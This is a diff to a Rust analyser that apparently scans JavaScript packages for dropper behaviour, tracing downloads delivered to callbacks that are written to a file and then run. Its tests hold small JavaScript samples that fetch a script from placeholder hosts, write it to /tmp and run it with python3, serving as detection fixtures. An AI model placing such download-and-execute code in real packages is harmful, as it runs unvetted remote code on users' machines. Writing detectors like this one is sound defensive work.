@@ -162,6 +162,53 @@ pub(crate) fn first_drop(text: &[u32], findings: &[Out]) -> Option<DropRun> {
         })
 }
 
+/// The finding for a written file run: what it held decoded or carved out of another file, or downloaded and run by an
+/// interpreter (a program downloaded and run is what installers of binaries do: none).
+pub(crate) fn dropped_out(w: &Written, interp: Option<PyStr>, at: u32) -> Option<Out> {
+    let interp = script_interp(w, interp);
+    if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
+        return None;
+    }
+    Some(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp })
+}
+
+/// The written file a run runs, with its interpreter: one of the paths it may run (their keys), or one a constant
+/// command line of it runs (`_DL_RUNNERS`).
+fn run_of_written(sup: &Supply, runs: &[(Vec<PyStr>, Option<PyStr>)], lines: &[PyStr]) -> Option<(Written, Option<PyStr>)> {
+    for (keys, interp) in runs {
+        if let Some(w) = written_at(&sup.written, keys) {
+            return Some((w, interp.clone()));
+        }
+    }
+    if !lines.is_empty() {
+        let table = sup.written.borrow().clone();
+        for w in table {
+            for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
+                let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
+                    crate::received::command_runs(sup.p(), seg, &k[1..])
+                });
+                if let Some(seg) = seg {
+                    let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
+                    return Some((w.clone(), interp));
+                }
+            }
+        }
+    }
+    None
+}
+
+/// The runs read before a write of their file was known, whose file is known written by the end (D-2), but for
+/// those `findings` has already.
+pub(crate) fn late_drops(sup: &Supply, findings: &[Out]) -> Vec<Out> {
+    let known: HashSet<u32> = findings.iter().filter_map(|f| if let Out::Dropped { at, .. } = f { Some(*at) } else { None }).collect();
+    let pending = sup.runs.borrow().clone();
+    pending
+        .iter()
+        .filter(|r| !known.contains(&r.at))
+        .filter_map(|r| run_of_written(sup, &r.runs, &r.lines).and_then(|(w, interp)| dropped_out(&w, interp, r.at)))
+        .collect()
+}
+
 /// A command line's parts: literal text, or an expression.
 pub(crate) enum Part<T> {
     Text(PyStr),
@@ -424,6 +471,20 @@ pub struct Supply {
     /// the files the script writes code or a program to (a run of one is
     /// a dropper's)
     pub written: std::cell::RefCell<Vec<Written>>,
+    /// the runs of a file read before any write of it was known (D-2: a
+    /// callback's download is known when its summary is applied, after the
+    /// callback that runs the file was read): matched at the end
+    pub runs: std::cell::RefCell<Vec<PendingRun>>,
+}
+
+/// A run of a file (`sc_file_run`) whose file no write was known for yet: the
+/// paths it may run (their keys, the interpreter), its constant command
+/// lines, where.
+#[derive(Clone, Debug)]
+pub struct PendingRun {
+    pub runs: Vec<(Vec<PyStr>, Option<PyStr>)>,
+    pub lines: Vec<PyStr>,
+    pub at: u32,
 }
 
 use std::collections::HashSet;
@@ -440,6 +501,7 @@ impl Supply {
             whole,
             arg_of: std::cell::RefCell::new(None),
             written: std::cell::RefCell::new(Vec::new()),
+            runs: std::cell::RefCell::new(Vec::new()),
         }
     }
 
@@ -2089,9 +2151,29 @@ impl<'p> Eval<'p> {
             return None;
         };
         if let Some(sc) = data.as_ref().filter(|d| d.src).and_then(|d| d.sc.clone()) {
-            record_written(&self.sup().written, keys, &sc, at);
+            record_written(&self.sup().written, keys.clone(), &sc, at);
+        }
+        // (a parameter written: the function's summary keeps the file, so a callback given a download writes it, D-2)
+        if let Some(d) = data.as_ref() {
+            for &key in d.params.iter() {
+                self.pf_adds.push((key, keys.clone(), at));
+            }
         }
         None
+    }
+
+    /// supply mode: a parameter a function writes to the file of `keys` at `at` is given `t` at a call (eval's
+    /// apply): a download, or code the script decodes or carves out, written there; a parameter of the caller's,
+    /// written there through it.
+    pub(super) fn sc_param_file(&mut self, t: &V, keys: Vec<PyStr>, at: u32) {
+        if t.src {
+            if let Some(sc) = t.sc.as_ref() {
+                record_written(&self.sup().written, keys.clone(), sc, at);
+            }
+        }
+        for &key in t.params.iter() {
+            self.pf_adds.push((key, keys.clone(), at));
+        }
     }
 
     /// supply mode: a call that runs a program (`spawn(p)`, `execSync(p +
@@ -2153,39 +2235,24 @@ impl<'p> Eval<'p> {
             return;
         }
         let sup = self.sup();
-        for (n, interp) in runs {
-            let keys = self.sc_path_keys(n, scope);
-            if let Some(w) = written_at(&sup.written, &keys) {
-                self.sc_dropped(&w, interp, at);
-                return;
-            }
+        let runs: Vec<(Vec<PyStr>, Option<PyStr>)> = runs.into_iter().map(|(n, interp)| (self.sc_path_keys(n, scope), interp)).collect();
+        if let Some((w, interp)) = run_of_written(&sup, &runs, &lines) {
+            self.sc_dropped(&w, interp, at);
+            return;
         }
-        // a constant command line: a written file it runs (`_DL_RUNNERS`)
-        if !lines.is_empty() {
-            let table = sup.written.borrow().clone();
-            for w in table {
-                for k in w.keys.iter().filter(|k| k.first() == Some(&0x3D)) {
-                    let seg = lines.iter().flat_map(|l| l.split(|&c| c == 0x3B || c == 0x26 || c == 0x7C || c == 0x0A)).find(|seg| {
-                        crate::received::command_runs(sup.p(), seg, &k[1..])
-                    });
-                    if let Some(seg) = seg {
-                        let interp = pystr::split_ws(seg).first().and_then(|w| interp_name(w));
-                        self.sc_dropped(&w, interp, at);
-                        return;
-                    }
-                }
-            }
+        // (no write of it known yet: a callback's may be, by the end, D-2)
+        let mut pending = sup.runs.borrow_mut();
+        if !pending.iter().any(|r| r.at == at) {
+            pending.push(PendingRun { runs, lines, at });
         }
     }
 
     /// The finding for a written file run: what it held decoded or carved
     /// out of another file, or downloaded and run by an interpreter.
     fn sc_dropped(&mut self, w: &Written, interp: Option<PyStr>, at: u32) {
-        let interp = script_interp(w, interp);
-        if w.kinds & (K_DECODED | K_CARVED) == 0 && interp.is_none() {
-            return; // (a program downloaded and run: what installers of binaries do)
+        if let Some(out) = dropped_out(w, interp, at) {
+            self.findings.push(out);
         }
-        self.findings.push(Out::Dropped { at, from: w.at, kinds: w.kinds, what: w.what.clone(), interp });
     }
 
     /// Is a call's first argument a command line that downloads (curl or
@@ -3133,6 +3200,8 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
     if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
         return None;
     }
+    let late = late_drops(&sup, &findings);
+    findings.extend(late);
     // the strongest send: data over what only an address holds, a harvest
     // over other data, then the first; the first received code
     let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
@@ -3616,7 +3685,6 @@ mod tests {
         let src = "const fs = require('fs');\nconst { fork } = require('child_process');\nconst p = `${__dirname}/w.js`;\nfs.writeFileSync(p, require('zlib').inflateSync(blob));\nfork(p);\n";
         assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((5, Some("node".into()))));
         // a download written, run by an interpreter; a binary downloaded and run (installers): nothing
-        // (what a callback is given is followed by the function's summary, which keeps no file: not yet)
         let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/i.js');\n  fs.writeFileSync('i.js', await res.text());\n  spawn(process.execPath, ['i.js']);\n}\ngo();\n";
         assert_eq!(dropped(src).map(|d| (d.0, d.1, d.3)), Some((6, K_RECEIVED, Some("node".into()))));
         let src = "const fs = require('fs');\nconst { execFileSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/bin');\n  fs.writeFileSync('bin/tool', Buffer.from(await res.arrayBuffer()));\n  execFileSync('bin/tool', ['--version']);\n}\ngo();\n";
@@ -3636,6 +3704,35 @@ mod tests {
         // a text read sliced is not a binary's
         let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst s = fs.readFileSync('a.txt', 'utf8').slice(10);\nfs.writeFileSync('/tmp/a', s);\nspawn('/tmp/a');\n";
         assert_eq!(dropped(src), None);
+    }
+
+    #[test]
+    fn a_download_a_callback_is_given_written_then_run() {
+        // D-2: the response a callback is given, written to a file and run; the function's summary keeps the file it
+        // writes a parameter to, so the write is known when the client gives the callback the download
+        let head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
+        let cases = [
+            // the request client's callback, given the body
+            "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
+            // https.get's response, its chunks gathered, written when it ends
+            "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
+            // piped into a file, run when the file is finished
+            "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
+            // a helper that writes what it is given, the run elsewhere
+            "const https = require('https');\nfunction save(data) { fs.writeFileSync(p, data); }\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { save(d); exec('python3 ' + p); }); });\n",
+        ];
+        for case in cases {
+            let src = format!("{}{}", head, case);
+            assert_eq!(dropped(&src).map(|d| (d.1, d.3)), Some((K_RECEIVED, Some("Python".into()))), "{}", case);
+        }
+        // a program downloaded and run (what an installer of a binary does); a download written, nothing run
+        let src = format!("{}{}", head, "const https = require('https');\nhttps.get('https://h.invalid/tool', (res) => { const f = fs.createWriteStream('/tmp/tool'); res.pipe(f); f.on('finish', () => require('child_process').spawn('/tmp/tool')); });\n");
+        assert_eq!(dropped(&src), None);
+        let src = format!("{}{}", head, "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n");
+        assert_eq!(dropped(&src), None);
+        // a callback given what the script reads from its own package, written and run: not a download
+        let src = format!("{}{}", head, "fs.readFile(__dirname + '/x.py', 'utf8', (err, d) => { fs.writeFileSync(p, d); exec('python3 ' + p); });\n");
+        assert_eq!(dropped(&src), None);
     }
 
     #[test]
